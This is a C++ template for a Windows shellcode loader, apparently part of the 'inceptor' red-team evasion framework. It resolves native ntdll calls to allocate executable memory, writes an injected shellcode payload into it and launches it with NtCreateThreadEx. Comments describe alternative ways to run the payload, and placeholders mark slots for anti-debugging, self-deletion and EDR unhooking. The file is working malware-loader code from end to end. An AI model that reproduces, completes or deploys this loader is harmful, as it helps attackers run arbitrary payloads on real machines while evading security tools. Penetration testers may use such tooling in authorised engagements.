#define _CRT_SECURE_NO_WARNINGS
#define MAX_ARGS 100
#define MAX_ARG_LENGTH 255

#include <windows.h>
#include <processenv.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

//####USING####

//####DEFINE####

//####CODE####

using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS (WINAPI *LPFUN_NtCreateThreadEx)
(
  OUT PHANDLE hThread,
  IN ACCESS_MASK DesiredAccess,
  IN LPVOID ObjectAttributes,
  IN HANDLE ProcessHandle,
  IN LPTHREAD_START_ROUTINE lpStartAddress,
  IN LPVOID lpParameter,
  IN BOOL CreateSuspended,
  IN ULONG StackZeroBits,
  IN ULONG SizeOfStackCommit,
  IN ULONG SizeOfStackReserve,
  OUT LPVOID lpBytesBuffer
);
struct NtCreateThreadExBuffer
{
  ULONG Size;
  ULONG Unknown1;
  ULONG Unknown2;
  PULONG Unknown3;
  ULONG Unknown4;
  ULONG Unknown5;
  ULONG Unknown6;
  PULONG Unknown7;
  ULONG Unknown8;
};

DWORD WINAPI PsychoBlast(LPVOID lpParameter)
{
    DWORD dwSize;
    SIZE_T bytesWritten;
    //HANDLE currentProcess;

    int length = ####SHELLCODE_LENGTH####;
    unsigned char* encoded = ####SHELLCODE####;

    //####CALL####

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);

    // Method 1: No process Specified

    myNtAllocateVirtualMemory fNtAllocateVirtualMemory = (myNtAllocateVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory"));

    HANDLE targetHandle = (HANDLE)((int)-1);
    SIZE_T RegionSize = (SIZE_T)length;
	LPVOID mem = nullptr;
	NTSTATUS status;

	status = fNtAllocateVirtualMemory(targetHandle, &mem, 0, (PSIZE_T)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status < 0){
	    printf("[-] Memory allocation failed\n");
	    exit(1);
	}

    // Method 2: Specifying current process
    //VOID* mem = VirtualAllocEx((HANDLE)-1, NULL, length + 1, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);
    if (mem == NULL)
        return -1;
    //VirtualProtect(mem, length, 0x40, &dwSize);

    bool success = false;
    // Method 1: No process Specified

    //success = memcpy(mem, decoded, length);

    // Method 2: Specifying current process
    success = WriteProcessMemory(targetHandle, mem, decoded, length, &bytesWritten);
    if (success == 0){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }

    int ret_val = 0;
    printf("[*] Executing\n");
    // Method 1: No process Specified, using function pointer
    //int (*my_main)(char**) = (int(*)(char**)) ((ULONGLONG)mem);
    // With no params, this definition would be good as well
    //((void(*)())mem)();

    HANDLE hThread = NULL;

    LPFUN_NtCreateThreadEx funNtCreateThreadEx =
             (LPFUN_NtCreateThreadEx) GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");

    NtCreateThreadExBuffer ntbuffer;

    memset (&ntbuffer,0,sizeof(NtCreateThreadExBuffer));
    DWORD temp1 = 0;
    DWORD temp2 = 0;

    ntbuffer.Size = sizeof(NtCreateThreadExBuffer);
    ntbuffer.Unknown1 = 0x10003;
    ntbuffer.Unknown2 = 0x8;
    ntbuffer.Unknown3 = &temp2;
    ntbuffer.Unknown4 = 0;
    ntbuffer.Unknown5 = 0x10004;
    ntbuffer.Unknown6 = 4;
    ntbuffer.Unknown7 = &temp1;
    ntbuffer.Unknown8 = 0;

    status = funNtCreateThreadEx(
                        &hThread,
                        0x1FFFFF,
                        NULL,
                        targetHandle,
                        (LPTHREAD_START_ROUTINE) mem,
                        lpParameter,
                        FALSE, //start instantly
                        NULL,
                        NULL,
                        NULL,
                        &ntbuffer
                        );

    if (!NT_SUCCESS(status)){
        printf("[-] Couldn't execute thread\n");
        printf("[-] Reason: 0x%08x\n", GetLastError());
        exit(1);
    }

    //char** args = (char**)lpParameter;

    //ret_val = my_main(args);
    //free(args);

    // Method 2: No process specified, using CreateThread
    /*
    DWORD threadID;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, &threadID);
    if(NULL == hThread){
        printf("[-] Could not execute thread!\n");
        return -2;
    }else{
        printf("[+] Started thread %i\n", threadID);
    }
    WaitForSingleObject(hThread, INFINITE);
    */

    // Method 3: Specifying current process
    //CreateRemoteThread(currentProcess, NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, NULL);

    /* Method 4: Using Assembly to manipulate return address
    * 1. MOV &mem RCX ---> Store mem on RCX
    * 2. PUSH RCX     ---> Push mem on the stack
    * 3. RET          ---> mem is now in RIP, and gets executed
    asm volatile ("mov %0, %%rcx\n\t"
        "push %%rcx\n\t"
        "ret"
        :
    : "r" (mem));
    */
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####
    //####SELF_DELETE####
    //####UNHOOK####
    //LoadLibrary(L"C:\\Users\\d3adc0de\\Desktop\\Shared\\PenetrationTesting\\Git Personal Projects\\inceptor\\inceptor\\libs\\private\\x64\\syscall-detect.dll");

    PsychoBlast(NULL);
}

